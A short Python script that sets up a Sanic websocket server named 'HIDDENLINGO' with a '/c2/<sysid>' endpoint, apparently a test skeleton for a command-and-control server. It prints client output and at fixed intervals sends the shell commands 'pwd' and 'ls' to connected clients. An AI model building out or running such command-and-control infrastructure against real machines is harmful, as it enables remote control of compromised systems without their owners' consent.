#!/usr/bin/env python3

import asyncio

from time import sleep
from sanic import Sanic

app = Sanic(name='HIDDENLINGO')

test_inc = 0

async def _consumer_handler(ws):
    data = await ws.recv()
    print(data)
    await asyncio.sleep(.1)

async def _producer_handler(ws):
    global test_inc
    cmd = str()
    if test_inc == 3:
        cmd = 'pwd'
    elif test_inc == 10:
        cmd = 'ls'
    test_inc += 1
    msg = str()
    if cmd:
        msg = '0x00 ' + cmd
    sleep(1)
    await ws.send(msg)
    await asyncio.sleep(.1)

@app.websocket('/c2/<sysid>')
async def c2(request, ws, sysid):
    while True:
        consumer_task = asyncio.ensure_future(_consumer_handler(ws))
        producer_task = asyncio.ensure_future(_producer_handler(ws))
        done, pending = await asyncio.wait(
            [consumer_task, producer_task],
            return_when=asyncio.FIRST_COMPLETED,
        )
        for task in pending:
            task.cancel()

def main():
    app.run(host='0.0.0.0', port=1337)

if __name__ == '__main__':
    main()
